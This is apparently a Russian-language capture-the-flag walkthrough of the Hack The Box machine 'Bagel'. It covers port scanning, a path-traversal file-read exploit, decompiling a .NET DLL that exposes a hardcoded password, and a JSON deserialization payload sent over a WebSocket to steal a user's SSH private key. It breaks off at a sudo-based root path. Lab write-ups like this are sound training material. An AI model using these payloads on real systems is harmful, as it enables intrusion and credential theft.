# End-Of-Bagel

## Подключаемся к vpn от HTB.

```
sudo openvpn /home/kali/Downloads/lab_smipos.ovpn
```

1) Проверяем открытые порты с помощью программы Zenmap. 
```
nmap -T4 -A -v 10.10.11.201
```

```
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)
|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 29 Apr 2023 17:52:21 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 29 Apr 2023 17:52:37 GMT
|     Connection: close
|   Help, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 29 Apr 2023 17:52:47 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 29 Apr 2023 17:52:21 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (version).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
| http-title: Bagel &mdash; Free Website Template, Free HTML5 Template by fr...
```
![image](https://user-images.githubusercontent.com/77785989/235317015-6dc072ee-1538-4f68-a1a8-379ff423c5cf.png)

Как мы видим - открыто 3 порта: 22, 5000, 8000.

2) Помещаем 10.10.11.201 bagel.htb в папку с хостами.
```
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.201 bagel.htb
```
![image](https://user-images.githubusercontent.com/77785989/235317321-13dfaf59-6944-4994-b9aa-bf91698d519e.png)

3) Смотрим информацию о сайте с помощью команды whatweb.
```
whatweb 10.10.11.201:5000
http://10.10.11.201:5000 [400 Bad Request] Country[RESERVED][ZZ], HTTPServer[Microsoft-NetCore/2.0], IP[10.10.11.201]
```
 
```
whatweb 10.10.11.201:8000
http://10.10.11.201:8000 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.10.11.201], Python[3.10.9], RedirectLocation[http://bagel.htb:8000/?page=index.html], Title[Redirecting...], Werkzeug[2.2.2]
http://bagel.htb:8000/?page=index.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.10.11.201], JQuery, Meta-Author[freehtml5.co], Modernizr[2.6.2.min], Open-Graph-Protocol, Python[3.10.9], Script, Title[Bagel &mdash; Free Website Template, Free HTML5 Template by freehtml5.co], Werkzeug[2.2.2], X-UA-Compatible[IE=edge]
```
![image](https://user-images.githubusercontent.com/77785989/235317771-c87b67b4-1f99-4bb4-b708-c5534bfc45fa.png)

Порт 5000 выдает ошибку, а порт 8000 перенаправляет нас на страницу http://bagel.htb:8000/?page=index.html
![image](https://user-images.githubusercontent.com/77785989/235318585-bcc0d798-f028-4800-8b60-6b6262e1bc59.png)

Как мы можем видеть: в адресной строке имеется * page?=.html *
Значит мы можем попробовать что-нибудь вытянуть с помощью LFI.

Local File Inclusion
LFI — это возможность использования и выполнения локальных файлов на серверной стороне. Уязвимость позволяет удаленному пользователю получить доступ с помощью специально сформированного запроса к произвольным файлам на сервере, в том числе содержащую конфиденциальную информацию.

Открываем BurpSuite и пытаемся это сделать.

4) Пробуем достать файл /etc/passwd (файл представляет собой учетную запись пользователя)
![image](https://user-images.githubusercontent.com/77785989/235318659-e9021f3e-9483-416a-a5df-1c212432040f.png)
После 5 попытки мы получаем нужный нам файл.
Проверяем его:
```
cd Downloads
                                                                                                                               
┌──(kali㉿kali)-[~/Downloads]
└─$ cat passwd  
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```
![image](https://user-images.githubusercontent.com/77785989/235318743-c59b5d57-6c70-4e95-a81d-d3fa67a42157.png)

Двигаемся дальше и ищем файл proc/self/cmdline с целью просмотра процессов.

В этом файле вы найдете параметры, которые были указанны в строке запуска ядра загрузчиком Grub. Это может быть полезно при поиске и устранении проблем с загрузкой ядра или если необходимо выяснить какой точно файл был использован для загрузки.

Находим его и тоже просматриваем.
```
(kali㉿kali)-[~/Downloads]
└─$ cat cmdline
python3/home/developer/app/app.py                                                                                                                               

```
![image](https://user-images.githubusercontent.com/77785989/235318890-8d5c03ac-bf28-453a-8e19-40aa3d26668e.png)

Мы увидели путь к питоновскому файлу. Попытаемся выгрузить и его.
![image](https://user-images.githubusercontent.com/77785989/235319025-1a10fae4-73e0-45c4-a64e-27e8fe16531a.png)

```
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")
 ```
Просматривая файл, мы увидели интересную строчку: не забудьте сначала запустить приложение order с помощью команды "dotnet <путь к .". Используйте свой ssh-ключ для доступа к компьютеру."
![image](https://user-images.githubusercontent.com/77785989/235319129-cd219465-f809-4461-9c2d-45b013b8ae22.png)

Я предполагаю, что для доступа к orders необходимо запустить приложение dotnet, это приложение работает на порту 5000. попробуем поискать в процессах идентификатор.

Запускаем поиск данного процесса:
```
for i in $(seq 900 1000); do curl 10.10.11.201:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done


File not found  PID => 921
File not found  PID => 922
File not found  PID => 923
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 924
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 925
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 926
/usr/lib/polkit-1/polkitd--no-debug  PID => 927
```
Я нашел путь к файлу, который запускается с помощью dotnet
```
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 924
```
и пытаюсь выгрузить его. 
Все получается.
Путь к файлу: http://bagel.htb:8000/?page=../../../../../../../dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll

5) Скачиваем dnSpy и просматриваем файл bagel.dll

```
// C:\Users\smipo\Desktop\bagel.dll
// bagel, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

// Точка входа: bagel_server.Bagel.Main
// Время: <Неизвестно> (F753A2F1)

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Versioning;

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
[assembly: TargetFramework(".NETCoreApp,Version=v6.0", FrameworkDisplayName = "")]
[assembly: AssemblyCompany("bagel")]
[assembly: AssemblyConfiguration("Debug")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyInformationalVersion("1.0.0")]
[assembly: AssemblyProduct("bagel")]
[assembly: AssemblyTitle("bagel")]
```
![image](https://user-images.githubusercontent.com/77785989/235320379-fa864623-5cfe-4ebd-8c53-7ae7748f1b59.png)

Находим логин и пароль разработчика:
```
string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
```
![image](https://user-images.githubusercontent.com/77785989/235324822-f3e515c8-bcdc-4a47-8140-27130208812d.png)

6) Предположим, что в коде dotnet есть уязвимость десереализации JSON.

```
public object Deserialize(string json)
{
	object result;
	try
	{
		result = JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings
		{
			TypeNameHandling = 4
		});
	}
	catch
	{
		result = "{\"Message\":\"unknown\"}";
	}
	return result;
}
```
Вышеупомянутая уязвимость используется только с базовыми классами, базовые классы наследуются от Order, а в самом Order у нас есть RemoveOrder, несущий объектный тип данных.
```
var ws = new WebSocket("ws://bagel.htb:5000/");
ws.onmessage = (event) => {
  console.log(event.data);
}
ws.send(JSON.stringify({ "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}))
```
Отправляю RemoveOrder на сервер под типом данных bagel_server.Файл является файлом для чтения ../../../../../../ home/phil/.ssh / id_rsa
цель - реализовать LFI для чтения файла id_rsa и получения SSH ключа.
![image](https://user-images.githubusercontent.com/77785989/235320819-1db52a09-be08-4145-8cb8-b3853441f346.png)

Сохраняем ключ и пытаемся зайти под пользователем phil:
```
(kali㉿kali)-[~/Downloads]
└─$ ssh phil@10.10.11.201 -i id_rsa
Warning: Permanently added '10.10.11.201' (ED25519) to the list of known hosts.
Last login: Sat Apr 29 20:13:46 2023 from 10.10.14.95
[phil@bagel ~]$                                                                                                                                
```
![image](https://user-images.githubusercontent.com/77785989/235347664-16b3f937-3177-4989-b0c6-b51a5ffd9d1f.png)

Перезаходим под пользователем разработчик:
```
[phil@bagel ~]$ su developer
Password: 
[developer@bagel phil]$ 
```
![image](https://user-images.githubusercontent.com/77785989/235347732-804ca6da-da28-415b-8fdf-ba82ac50f27d.png)

Поскольку мы знаем пароль пользователя developer, мы смотрим, есть ли у него какие-либо специальные разрешения, и, похоже, он может запускать dotnet как если бы он был root.

```
[developer@bagel phil]$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[developer@bagel phil]$ 

```

```
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
[developer@bagel phil]$ 

```
Видим, что папка без пароля и своими шалавливыми ручками лезем туда
